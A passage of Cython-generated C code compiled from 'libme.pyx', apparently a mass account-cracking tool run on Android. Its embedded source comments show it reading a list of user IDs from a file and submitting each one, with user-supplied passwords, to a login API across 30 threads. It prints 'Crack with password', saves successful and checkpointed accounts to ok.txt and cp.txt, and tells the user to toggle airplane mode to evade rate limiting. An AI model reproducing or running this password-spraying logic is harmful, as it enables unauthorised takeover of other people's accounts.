      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":502
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":508
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 508, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_ask = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "libme.pyx":509
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 509, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":510
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 510, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 510, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":511
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_separators_44) < 0) __PYX_ERR(0, 511, __pyx_L18_error)

            /* "libme.pyx":512
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 512, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_v_listpass = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":513
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 513, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":514
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 514, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":513
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":515
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 515, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 515, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "libme.pyx":516
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 516, __pyx_L18_error)

            /* "libme.pyx":517
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 517, __pyx_L18_error)

            /* "libme.pyx":518
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 518, __pyx_L18_error)

            /* "libme.pyx":519
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
              __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 519, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 519, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 519, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 519, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                }
              } else {
                __pyx_t_4 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_4)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 519, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_4);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
              __pyx_t_4 = 0;

              /* "libme.pyx":520
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 520, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 520, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                PyObject* sequence = __pyx_t_4;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 520, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 520, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 520, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 520, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 520, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 520, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":521
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 521, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 521, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 521, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 521, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 521, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 521, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 521, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 521, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":519
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":510
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Frr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 510, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 510, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 510, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 510, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 510, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 510, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":509
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":522
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 522, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":523
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 523, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 523, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 523, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 523, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
